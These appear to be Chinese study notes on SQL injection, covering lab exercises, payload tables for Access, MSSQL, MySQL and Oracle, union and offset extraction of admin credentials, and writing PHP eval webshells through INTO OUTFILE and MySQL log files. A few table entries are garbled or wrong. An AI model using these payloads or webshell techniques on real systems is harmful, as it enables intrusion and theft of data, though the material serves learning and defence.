# SQL注入原理

## SQL注入原理

当Web应用向后台数据库传递SQL语句进行数据库操作时，若对用户输入的参数没有经过严格的过滤处理，攻击者可以构造特殊SQL语句，直接输入数据库引擎执行，获取或修改数据库中数据。

* SQL注入漏洞本质：把用户输入的数据当作代码执行，违背了“数据与代码分离”的原则。
* SQL注入漏洞有两个关键条件：
  * 用户能控制输入内容
  * Web应用把用户输入的内容带入到数据库中执行

大白话1：`脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。`

大白话2：`SQL注入实质就是闭合前一句查询语句，构造恶意语句，恶意语句被带入SQL语句执行。`



## 手工注入的攻击步骤

参考文章：

[sql注入-原理&防御 - simon7s - 博客园](https://www.cnblogs.com/simon7s/p/12420632.html)

> 1、确认目标参数

我们首先要确定要测试哪些参数。在以前参数还是比较容易确定的，比如前面说的http://example.com/app/accountView?id=1，问号后边的参数大多是动态参数。

但现在都讲restful，所以首先参数并不一定在问号后边，比如url可能变成http://example.com/app/accountView/1/这样的；其次大多参数都是`post`的，所以目标要从url更多转移到post数据上。

> 2、确认动态参数

动态参数就是带入数据库的参数，很多参数是不带入数据库的而只有带入数据库的参数才有可能导致sql注入，所以我们需要确认哪些参数是动态参数。

没具体去分析sqlmap等工具是怎么确定一个参数是不是动态参数，我们可以使用前面说的单引号法和1=1/1=2法，如果参数有过滤不能注入那我们权当他不是动态参数也一样的。

> 3、爆出数据库类型

因为虽然数据库都兼容sql92，但不同的数据库其具有的系统库表和扩展功能都是不一样的，这导致我们后续查询库名、表名、列名具体注入语句会随数据库的不同而有差异，所以首先要确认服务端使用的是什么数据库，是oracle还是mysql还是其他。

和检测操作系统等类似，判断是什么数据库也是用“指纹”的形式，数据库的指纹就是数据库支持的注释符号、系统变量、系统函数、系统表等，所以应该可以整理出更多的检测语句。

`还有其他的数据库类型`

| 数据库 | 注入语句                                                     | 原理                                                         | 用处                                                         |
| ------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| access | and user>0                                                   | user是mssql内置变量，类型为nvarchar；<br />nvarchar与int比较会报错 | msqql和access报错不一样可区分数据库是mssql还是access         |
| mssql  | and (select count(`*`) from sysobjects) >= 0<br />and (select count(`*`) from msysobjects) >= 0 | mssql存在sysobjects不存在msysobjects，上句不会报错下句会报错<br />access不存在sysobjects存在msysobjects，上句会报错下句不会报错 | 可用于确认数据库是mssql还是access                            |
| mysql  | select @@version<br />select database()                      | @@version是mysql的内置变量<br />database()是mysql的内置函数  | 如果返回正常则说明是oracle                                   |
| oracle | and exists(select * from dual)<br />and (select count(*) from user_tables)>0 -- | dual和user_tables是oracle的系统表                            | 如果返回正常则说明是oracle                                   |
| multl  | /*<br />--<br />;                                            | mysql支持的注释<br />mssql和oracle支持的注释<br />oracle不支持多行 | 报错说明不是mysql<br />不报错可能是mssql或oracle<br />报错极有可能是oracle |

> 4、爆出数据库名

| 数据库 | 注入语句                                                     | 说明                                                         |
| ------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| access |                                                              | access一个数据库对应一个文件，获取文件名没有很大意义         |
| mssql  | and db_name() = 0<br />and db_name(n) > 0                    | 从返回的报错信息中可获取当前数据库名<br />返回的报错信息中有第n个数据库的库名 |
| mysql  | and 1=2 union select 1,database()/*<br />and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit n,1<br />select group_concat(schema_name) from information_schema.schemata | 爆出当前数据库名<br />n为几就返回第几个数据库的库名返回空就表示没有更多数据库了<br />返回所有数据库名 |
| oracle | and 1=2 union select 1,2,3,(select owner from all_tables where rownum=1),4,5...from dual<br />and 1=2 union select 1,2,3,(select owner from all_tables where rownum=1 and owner<> '上一库名'),4,5... from dual | 返回第一个库名<br />返回当前用户所拥有的下一库名             |

> 5、猜解数据库表名

| 数据库 | 注入语句                                                     | 说明                                                         |
| ------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| access | and exists(select * from table_name)<br />and (select count(*) from table_name) >= 0 | 不断测试table_name<br />如果返回正常那说明该表存在           |
| mssql  | and (select cast(count(1) as varchar(10))%2bchar(94) from [sysobjects] where xtype=char(85) and status != 0)=0 --<br />and (select top 1 cast(name as varchar(256)) from (select top n id,name from [sysobjects] where xtype=char(85) and status != 0 order by id)t order by id dsec)=0--<br />and 0<>(select top 1 name from db_name.dbs.sysobjects where xtype=0x7500 and name not in (select top n name from db_name.dbo.sysobjects where xtype=0x7500)) -- | 可爆出当前数据库表的数量<br />n为几就输出第几张表的表名<br />n为几就输出db_name库第几张表的表名 |
| mysql  | and union select 1,table_name from information_schma.tables where table_schema=database() limit n,1--<br />select group_concat(table_name) from information_schema.tables where table_schema=database() | n为几就返回当前第几张表的表名<br />返回当前库的所有表名      |
| oracle | and 1=2 union select 1,2,3,(select table_name from user_tables where rownum=1),4,5... from dual<br />and 1=2 union select 1,2,3,(select table_name from user_tables where rownum=1 and table_name<>'上一表名'),4,5...from dual<br />and 1=2 union select 1,2,3,(select column_name from user_tab_columns where column_name like '%25pass%25'),4,5... from dual | 返回第一个表名<br />返回下一个表名<br />返回包含pass的表名   |

> 6、解字段名

| 数据库 | 注入语句                                                     | 说明                                                         |
| ------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| access | and exists(select column_name from table_name)<br />and (select count(column_name) from table_name) >=0 | table_name使用上一步得到的表名，不断试column_name<br />如果返回正常则说明该字段存在 |
| mssql  | having 1=1 --<br />group by 字段名1 having 1=1 --<br />group by 字段名1，字段名2 having 1=1 -- | 可获取表名和第一个字段名<br />可以得到第二个字段名<br />可以得到第三个字段名 |
| mysql  | and 1=2 union select 1,column_name from information_schema.columns where table_name =ascii_table_name limit n,1--<br />select group_concat(column_name) from information_schema.columns where table_name=ascii_table_name | ascii_table_name表示要查的表的表句的十六进制型示n为几就返回第几字段的字段名<br />返回指定表名的所有字段 |
| oracle | and 1=2 union select 1,2,3,(select column_name from user_tab_columns where table_name ='table_name' and rownum=1),4,5... from dual<br />and 1=2 union select 1,2,3,(select column_name from user_tab_columns where table_name ='table_name' and column<> '上一字段名' and rownum=1),4,5... from dual | 返回第一个字段名<br />返回下一个字段名                       |

> 7、猜解字段值

获取字段内容，各数据库的方法是比较通用的，大致，后面每个数据库类型怎么注入的思路会说明

~~~sql
方法一：逐字节猜解法

首先猜解出字段长度，然后再逐字节猜解。
and (select top 1 len(column_name) from table_name > 1  
and (select top 1 len(column_name) from table_name > 2
..
and (select top 1 len(column_name) from table_name > n-1
and (select top 1 len(column_name) from table_name > n

当n-1正常n错误时说明字段长度为n（二分法快一些）

and (select top 1 asc(mid(cloumn_name,1,1)) from table_name > 0
and (select top 1 asc(mid(cloumn_name,1,1)) from table_name > 1
..
and (select top 1 asc(mid(cloumn_name,1,1)) from table_name > n-1
and (select top 1 asc(mid(cloumn_name,1,1)) from table_name > n

n-1正常n错误时说明字段值第一位ascii码值为n，再使用mid(cloumn_name,2,1)等继续猜解后续各个位直至n即可
~~~

~~~sql
方法二：union select法

上边的逐字节猜解法是相当费劲的，使用union select能更快捷地获取字段值。
由于union select要求两边的select返回的select字段数要一样，所以首先使用order by猜解前边select返回结果的字段数：

order by 1
order by 2
...
order by n-1
order by n

n-1正常，n报错时说明原先select字段数为n

然后使用union select查出表中内容

and 1=2 union select 1,2...,n from table_name----and 1=2是为了使原本的select结果为空，页面中出现数字x说明该处是显示的是第x字段的结果将x替换为字段名该处即会呈现该字段的内容

and 1=2 union select 1,2..,column_name..,n from table_name----上边的x替换成column_name，页面中x处即会显示column_name字段的内容
~~~



## Access

![image-20250112182417746](.\SQL注入原理.assets\image-20250112182417746.png)

参考文章：

https://blog.csdn.net/weixin_43267605/article/details/113621653

[第24天：WEB攻防-通用漏洞&SQL注入&MYSQL跨库&ACCESS偏移 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695942.html)

1. access数据库是一个文件，独立存在，后缀名为 *.mdb

2. Access数据库`简单`注入原理：
   判断注入点（将这些字符放到诸如点后面观察页面变化，来判断是否带入了数据库进行查询）：

   - And 1=1

   - And 1=2

   - /

   - 0

   - .0

   - .1

3. 判断数据库注入

4. 判断数据类型

   - and exists (select * from msysobjects)>0 如果页面正常返回，则表明数据库类型位Access

   - and exists (select * from sysobjects)>0 如果页面正常返回，则表明数据库类型位sqlserver

5. 判断数据库表

   * and exists (select * from admin)

6. 判断数据库列名

   * and exists (select admin from admin)

7. 判断字段长度

   * order by 20

8. 判断

   - and 1=2 union select 1,2,3,4,5,6,7,8,9 from admin

   - 这里采用联合查询报显位

9. 数据库联合查询（admin、password字段靠猜测才能得到，可以跑字典）

   * and 1=2 union select 1,2,admin,4,password,6,7,8,9 from admin

   > 由于Access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入！

10. 判断用户密码的长度

    - and (select len(admin) from admin)=5 如果返回正常说明管理员账户的长度为5

    - and (select len(password) from admin)=5 猜解管理密码长度是否为5



猜解管理员账号的第一个数据
通过判断ascii码来判断

```sql
and (select top 1 asc(mid(admin,1,1)) from admin)>100
返回正常说明大于，不正常说明不大于
and (select top 1 asc(mid(admin,1,1)) from admin)>50 返回正常说明大于
and (select top 1 asc(mid(admin,1,1)) from admin)=97 返回正常说明等于97
97对应的字母为a
以此类推
判断管理员账户的第二数据
and (select top 1 asc(mid(admin,2,1)) from admin)>100
返回正常说明大于，不正常说明不大于 第三个
and (select top 1 asc(mid(admin,3,1)) from admin)>100
返回正常说明大于，不正常说明不大于 判断管理员密码的第一个数据
and (select top 1 asc(mid(password,1,1)) from admin)>100
返回正常说明大于，不正常说明不大于
```


access数据库的`偏移注入`：

**偏移注入就是解决表明已知，列名未知的情况！**

例如下面的靶场：

~~~sql
原理：
1、用*号去替换一个字段，从最后一个字段数向前逐个删除来替代，直到显示正常为止，*代表了所有该admin表*的字段

例如：
原语句：http://192.168.10.128/Production/PRODUCT_DETAIL.asp?id=1513 +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
替换后的语句：http://192.168.10.128/Production/PRODUCT_DETAIL.asp?id=1513 +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin

逐渐减少字段，直到正确
当减少到16的时候显示正常：
语句：http://192.168.10.128/Production/PRODUCT_DETAIL.asp?id=1513 +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin

~~~

![image-20250112165943893](.\SQL注入原理.assets\image-20250112165943893-17366723846661.png)

![image-20250112170007881](.\SQL注入原理.assets\image-20250112170007881.png)

~~~sql
那么*号就代表6个
得出字段后采用下面的计算公式，进一步注入
公式：联合查询所需要补充的字段数=当前字段数量-目标表的字段数*N（几级偏移）
一级：
22-16=6

二级：
10+6*2=22
需要在select语句中补充10个字段。
语句:union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)

三级：
4+6*3=22
需要在select语句中补充4个字段。
语句：union select 1,2,3,4,* from (admin as a inner join (admin as b inner join admin as c on b.id = c.id) on a.id = b.id)

**************************************************************************
可能课程中的语句不怎么同，所以代表的几级偏移也不同 
一级：union select 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id)

二级：union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)

两种语句都可以实现偏移注入的目的，只是在字段补充和内连接的层次上有所不同。两种方法都可以使总字段数达到22个，从而在已知的显示位上暴露目标字段值。
**************************************************************************

~~~

跨库查询：

~~~perl
条件:同服务器下的站点有注入,知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来跨库查询. 绝对路径：D:/wwwroot/…*.mdb .asa .asp）

例如：
a是目标站点 b是存在注入的站点 a,b是同服务器的站点
admin为数据库中的表
user为数据库中admin表的段
password为数据库中admin表的段.

http://xxx.com/news/type.asp?type?id=1 and 1=2 union select 1,2,user,4,5,6 from [D:\wwwroot\1\Databases\xycms.mdb].admin

http://127.0.0.1:81/0/Production/PRODUCT_DETAIL.asp?id=1451 union select 1,2,username,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from [D:\wwwroot\1\Databases\xycms.mdb].admin

http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp id=-1513%20UNION%20SELECT%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22%20from%20admin_user%20in%20’C:\Users\Seven\Desktop\webpentest\1\xydata\xycms.mdb’

~~~



靶场测试：![image-20250112164309173](.\SQL注入原理.assets\image-20250112164309173.png)

![image-20250112164317988](.\SQL注入原理.assets\image-20250112164317988.png)

## MYSQL

注入思路和案例主要以mysql来写

![image-20250112182405890](.\SQL注入原理.assets\image-20250112182405890.png)

参考文章：

[Sql注入详解(原理篇)_sql注入攻击的原理-CSDN博客](https://blog.csdn.net/weixin_45954730/article/details/131525362)

[sql注入数据库原理详解-有勇气的牛排个人博客](https://www.couragesteak.com/article/402#side_toc5)

[SQL 注入总结 - han个人博客](https://meethanmj.github.io/2019/09/07/sqlSum/#SQL-注入流程)

### **常用函数**

收集操作系统、数据库版本、数据库名、数据库用户等信息，为后续注入做准备

~~~sql
# 一些SQL注入常用的函数
version()                 # 查看数据库版本
database()                # 查看当前数据库名
user()                    # 查看当前数据库用户
system_user()             # 查看系统用户名
concat()				  # 没有分隔符地连接字符串
concat_ws()				  # 含有分隔符地连接字符串
group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串
@@datadir                 # 查看数据库路径
@@version_compile_os      # 查看操作系统
@@basedir	    		  # 数据库安装路径
current_user()			  # 当前用户名
session_user()			  # 连接数据库的用户名
						  
count()					  # 返回执行结果数量
left()					  # 返回字符串最左边几个字符
floor()					  # 返回小于或等于 x 的最大整数
extractvalue()			  # 用于报错注入
strcmp()				  # 比较字符串内容
load_file()				  # 读取本地文件
into outfile()			  # 写文件
ascii()					  # 字符串的 ASCII 码值
ord()					  # 返回字符串第一个字符的 ASCII 值
mid()/substr()			  # 返回一个字符串的一部分
length()				  # 返回字符串长度
sleep()					  # 让语句运行N秒钟
if()					  # > select if(1>2,2,3);-> 3
char()					  # 返回 ASCII 代码组成的字符串
updatexml()				  # 用于报错注入
exp()					  # 返回 e 的 x 次方
~~~

例如：

> 1、数据库版本-看是否符合information_schema查询-version()-5.5.53
> 2、数据库用户-看是否符合ROOT型注入攻击-user()-root@localhost
> 3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os-win
> 4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()-syguestbook

### 字符串连接函数

三大法宝

~~~sql
concat()
group_concat()
concat_ws()
~~~

#### concat() 函数

特点：`concat(str1,str2,...)`
返回结果为连接参数产生的字符串，如果任何一个参数为NULL，则返回值为NULL，可以有一个或多个参数

**不使用字符连接函数：**

~~~sql
select isbn,title from books limit 1;

+---------------+----------------------------------+
| isbn          | title                            |
+---------------+----------------------------------+
| 9787302458210 | SQL Server 从入门到精通（第2版）    |
+---------------+----------------------------------+
~~~

**使用示例**
一般我们都要用一个字符将各个项隔开，便于数据的查看

~~~sql
select concat(isbn,',',title) from books limit 1;

+------------------------------------------------+
| concat(isbn,',',title)                         |
+------------------------------------------------+
| 9787302458210,SQL Server 从入门到精通（第2版）    |
+------------------------------------------------+
~~~

#### concat_ws() 函数

CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。
特点：`CONCAT_WS(separator,str1,str2,…)`

**使用示例**

![image.png](.\SQL注入原理.assets\77b1a543c7d914754ec0dc41c8699255.png)

#### group_concat() 函数

`GROUP_CONCAT`函数返回一个字符串结果，该结果由分组中的值连接组合而成。

~~~sql
select bid,author,group_concat(bid) from books where author in('金勇先','方兆祥 著') group by bid;
~~~

sql语句如同上面

### 关于MySQL的特性

[INFORMATION SCHEMA详解 - 蔚蓝的海洋 - 博客园](https://www.cnblogs.com/sgw1018/p/mysql-information-schema.html)

~~~sql
在MySQL5.0版本后，MySQL默认在数据库中存放一个 information_schema 的数据库，该数据库中包含了当前系统中所有的数据库、表、列、索引、视图等相关的元数据信息，是MySQL自身信息元数据的存储库，

* information_schema：存储数据库下的数据库名及表名，列名信息的数据库

一般要记住的三个表名
* information_schema.schemata:记录数据库信息表
> 存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。

* information_schema.tables：记录表名信息的表
> 存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema 和 table_name.

* information_schema.columns：记录列名信息表
> 存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。
~~~

![在这里插入图片描述](.\SQL注入原理.assets\57b7d058d289b01ef2840141de865f09.png)

~~~sql
# 查询所有的数据库名
select schema_name from information_schema.schemata limit 0,1
# 查询指定数据库security中的所有表名
select table_name from information_schema.tables where table_schema='security' limit 0,1
# 查询指定数据库security中的指定数据表users的所有列名
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
~~~

![image-20250112182115491](.\SQL注入原理.assets\image-20250112182115491.png)

### 关于MySQL注释

~~~sql
--+
#
~~~

在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是`#`和`-- `(`--`后面有空格)

但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中`#号`是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 `get` 传参时不包括`#`，因为使用 `# `闭合无法注释，会报错；而使用`--` （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用` --+ `的方式来闭合，因为`+`会被解释成空格。
~~~perl
* 也可以使用--%20，把空格转换为url encode编码格式，也不会报错。同理把 # 变成 %23 ,也不报错。
* 如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。
~~~



### **如果是低权限账号，则常规注入**

### **如果是高权限root账号，则攻击方式有**

* 猜解数据

* 文件读写

* 跨库查询

* 等等

如果显示一部分，用到group_concat函数就可以显示全部，下面会讲到



靶场：

![image-20250112183542002](.\SQL注入原理.assets\image-20250112183542002.png)



### Mysql跨库注入（查询）

跨库注入是指攻击者可以通过注入攻击代码来执行对其他数据库的操作。攻击者可以使用这种技术来获取或修改其他数据库的数据，包括敏感信息的泄露、恶意代码的执行、修改或删除数据等。跨库注入首先需要明确注入点的权限，`若不是root权限或者管理员权限，那么无法执行跨库注入，只有高权限才能执行跨库注入`。
简单来说，跨库注入就是在同一个数据库管理系统中，在某一个点存在SQL注入，而通过这点查询到，该权限为 root 权限，那么就可以使用这种方式去操作同数据库下的其它网站数据库，这样就实现的跨库注入。

---

#### **案例：**

~~~perl
跨库注入：实现当前网站跨库查询其他数据库对应网站的数据
获取当前mysql下的所有数据库名
语句：UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.schemata
~~~

![image-20250112184324074](.\SQL注入原理.assets\image-20250112184324074.png)

~~~perl
获取数据库名blog下的表名信息
UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='blog'
~~~

![image-20250112184519144](.\SQL注入原理.assets\image-20250112184519144.png)

~~~perl
获取数据库名blog下的表products下的列名信息：
UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='products' and table_schema='blog'
~~~

![image-20250112184645849](.\SQL注入原理.assets\image-20250112184645849.png)

~~~perl
获取指定数据
UNION SELECT id,context,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from blog.products
~~~

![image-20250112184900151](.\SQL注入原理.assets\image-20250112184900151.png)

### 文件读取

文件读取函数

~~~sql
load_file()
~~~

- `load_file()`除了读取本地文件，同样也支持网络路径
  ![在这里插入图片描述](.\SQL注入原理.assets\0df6d4f6fda56e9b5f071783b9d64e0a.png)![在这里插入图片描述](.\SQL注入原理.assets\bfaea260a552447376595602794cef55.png)

- load data infile
  使用local需要设置local_infile开启，该变量默认为ON，可以使用以下命令查看：SHOW GLOBAL VARIABLES LIKE 'local_infile'。果指定local关键词"load data local infile <文件路径> into TABLE <表名>"，则表明从客户主机读文件：

  > - 如果指定的文件路径为绝对路径，则客户机从根目录开始查找该文件。
  > - 如果指定的文件路径为相对路径，则客户机从当前目录开始查找该文件

  如果没指定`local`关键词`"load data infile <文件路径> into TABLE <表名>"`，则文件必须位于服务器上：

  > - 如果指定的文件路径为绝对路径，则服务器从根目录开始查找该文件。
  > - 如果指定的文件路径为相对路径，则服务器从数据库的数据目录中开始查找该文件。

  ![在这里插入图片描述](.\SQL注入原理.assets\729f891f6f7b6b77b5db8667c5cc10a0.png)

  > `load_file()`和`load data infile`读取文件可以直接读取，也可以新建一个表，读取文件为字符串形式插入表中，然后读出表中数据。
  > 常见的读取的敏感数据：https://www.cnblogs.com/Loong716/p/9891152.html

### 文件写入

* into outfile

~~~sql
# 语法格式：
SELECT column1,column2,...
FROM table_name
WHERE condition        
INTO OUTFILE 'file_path'         # 指定文件所在的路径
FIELDS TERMINATED by 'char';     # 每一条记录的数据之间默认以 Tab 分隔，也可使用 	FIELDS TERMINATED 参数指定分隔符
~~~

![在这里插入图片描述](.\SQL注入原理.assets\75c1ff1e06940bc386f2ae5a659c8c48.png)

* into dumpfile

~~~sql
# 语法格式
SELECT column1, column2, ...
FROM table_name
INTO DUMPFILE 'file_path'
[options]
~~~

![在这里插入图片描述](.\SQL注入原理.assets\a821ea1cc403acb8edfa1ea545f3bf3f.png)

> into outfile和into dumpfile的区别
>
> * 导出的行数不一样。outfile函数可以导出（导出数据库数据，写入文件）多行数据；而dumpfile只能导出一行数据
> * 是否转义输出。outfile对导出内容中的\n等特殊字符进行了转义，并且在文件内容的末尾增加了一个新行；而dumpfile对文件内容是原意写入，未做任何转移和增加。所以基于此在UDF提权中一般使用dumpfile进行dll文件写入
> * 是否允许二进制文件。outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中很棘手，因为会自动将单引号转义成\',请千万注意；但dumpfile，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\。因为dumpfile允许写二进制文件

### 基于MySQL写入shell的方式

#### **基于文件写入函数`into outfile`和`into dumpfile`写入shell**

~~~sql
# 将一句话木马"<?php eval($_REQUEST[1]);?>"通过十六进制编码写入网站根目录
?id=-3')) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\\Users\\Administrator.WIN2012\\Desktop\\phpStudy\\WWW\\outfile.php' --+
~~~

> 如果存在无法写入的情况下：
> secure_file_priv 突破 注入中需要支持 SQL 执行环境，没有就需要借助 phpmyadmin 或能够直接连上对方数据库进行绕过

#### **基于全局日志的写入**

基于全局日志的写入方式，适用于`secure_file_priv`这个配置参数限制了文件写入函数into outfile或into dumpfile函数的使用，没有写权限。有root权限，能够执行sql语句，并且网站的绝对路径且具有写入权限。查看日志配置，关注日志监测是否开启，然后修改日志路径，来写入shell
~~~sql
# 查看全局日志配置，包括log日志的开启状态和日志文件存储位置
show variables like "%general%";
# 开启日志监测
set global general_log = on;
# 设置需要写入的路径
set global general_log_file = 'file path';
# 然后执行sql语句，mysql会将我们执行的语句记录到日志文件(上一步修改后的文件)中
select "<?php eval($_POST['shell']);?>";
# 结束后，再修改为原来的路径
set global general_log_file = '原来的路径';
# 关闭日志记录
set global general_log = off;
~~~

![在这里插入图片描述](.\SQL注入原理.assets\230ae102c2b59e2eae26ad9295415f84.png)

#### **基于慢查询日志的写入**

慢日志记录的是执行时间超过一定时间的语句，默认的执行时间为10秒，通常情况下执行sql语句时的执行时间一般不会超过10s，所以说慢日志文件应该是比较小的，而全局日志记录文件会记录大量数据，可能会影响我们写入的内容。

~~~sql
# 查询慢日志功能开启状态以及慢日志目录 
show variables like '%slow_query_log%';
# 查看服务器默认时间值方式
show global variables like '%long_query_time%';
# 开启慢日志功能
set global slow_query_log = 'ON';
# 设置慢日志路径
set global slow_query_file = 'file path';
# 写入shell
select '<?php eval($_REQUEST["a"]);?>' or sleep(11);
~~~

#### 路径获取常见方法

文件读写的前提是获取到目标网站的相关文件路径，常见的获取文件路径的方法：

* **报错显示**
  网站报错时，会显示一些路径信息，可以使用谷歌语法搜素，结合关键字搜索出错页面的网页快照，常见关键字有`warning`和`fatal error`。注意，如果目标站点是二级域名，site接的是其对应的顶级域名

~~~sql
site:xxx.edu.tw "warning"
site:xxx.com.tw "fatal error"
~~~

* **遗留文件**
  很多网站的根目录下都存在测试文件，可以利用这些测试文件获取绝对路径，例如类似`phpinfo()`。

~~~sql
www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php
~~~

* 漏洞报错
  包括单引号爆路径和错误参数值爆路径。对于单引号爆路径，直接在URL后面加单引号（例如：www.xxx.com/news.php?id=149'），要求单引号没有被过滤服务器默认返回错误信息；对于错误参数值爆路径，将要提交的参数值改成错误值（例如：www.xxx.com/researcharchive.php?id=-1），比如-1、-99999、…等，单引号被过滤时不妨试试。

* 平台配置文件
  如果存在Sql注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息。各平台下Web服务器和PHP的配置文件默认路径可以上网查。

~~~sql
Windows:
c:\windows\php.ini                                  // php配置文件
c:\windows\system32\inetsrv\MetaBase.xml            // IIS虚拟主机配置文件
Linux:
/etc/php.ini                                        // php配置文件
/etc/httpd/conf/httpd.conf                          // Apache配置文件
/usr/local/apache/conf/extra/httpd-vhosts.conf      // 虚拟目录配置文件
...
~~~

### 基于报错信息注入

此方法是在页面没有显示位，但是 `echomysql_error()` 函数，在前端输出了错误信息的时候方能使用。
优点是注入速度快，缺点是语句较为复杂，而且只能用 limit 依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用 `echomysql_error()` 输出了错误信息时使用。常见的`select/insert/update/delete` 注入都可以使用报错方式来获取信息。

#### 三个常用报错函数

~~~bash
updatexml(): 函数是MYSQL对XML文档数据进行查询和修改的XPATH函数
extractvalue(): 函数也是MYSQL对XML文档数据进行查询的XPATH函数.
floor(): MYSQL中用来取整的函数.
~~~

### 数据类型

#### 数字

~~~bash
数字型 0-9
SQL语句：$sql="select * from sy_guestbook where id=$i";
http://127.0.0.1:8081/web/news.php?id=1
不需要单引号，也可以正常运行。
在数据库中执行：select * from sy_guestbook where id=1;
不用加引号，能正常运行，所以有一些数字型的注入点，不用加引号，就是不用考虑符号的闭合。
~~~

在大多数的网页中，诸如查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 "select * from 表名 where id=1" 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：
~~~sql
select * from 表名 where id=1 and 1=1
# 数字型驻点常见的注入语句(Payload)
# 查询数据库名和版本
id=-1 union select 1,database(),version() --+    

# 查询指定数据库中的表名
id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') --+   

# 查询指定数据库中指定表名中的列名字段
id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users') --+

# 查询指定表中的数据
id=-1 union select 1,database(),(select group_concat(username,':',password) from secyrity.users) --+  
~~~

#### 字符

~~~bash
字符型    a-z 中文，标点符号
SQL语句：$sql="select * from sy_guestbook where gTpl='$g'";
http://127.0.0.1:8081/web/news.php?gtpl=simple
需要单引号或者双引号 ，如果不用的话，那就回报错。会以为当成函数或者参数去执行。所以必须要用到引号，需要考虑符号的闭合，才能正确去执行SQL才能正常执行。
如果这样执行：select * from sy_guestbook where gName=PHP开源多功能留言板-随意留言板官方站;
正确的执行方法：select * from sy_guestbook where gName='PHP开源多功能留言板-随意留言板官方站';
~~~

![1645148860541-e6d7435d-1644-4bac-bd01-0528d928bff5.png](.\SQL注入原理.assets\2504969-20230912132659085-1185713646.png)

![1645148889207-adc5648b-52bf-4d47-aba8-b2bbc2759144.png](.\SQL注入原理.assets\2504969-20230912132659317-1902351315.png)

值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

~~~sql
select * from 表名 where name='admin' and 1=1 ''
# 字符型常见的注入语句(Payload)
# 后台语句 - SELECT * FROM users WHERE id=('$id') LIMIT 0,1
id=-1') union select 1,database(),version() --+
id=-2") union select 1,2,3--+
~~~

#### 搜索

~~~bash
搜索型
SQL语句：$sql="select * from sy_guestbook where gName like '%$s%'";
http://127.0.0.1:8081/web/news.php?search=演示
有百分号%通配符和单引号，需要进行闭合
本身SQL语句：select * from sy_guestbook where gName like '%$s%'
写入语句：http://127.0.0.1:8081/web/news.php?search=演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+
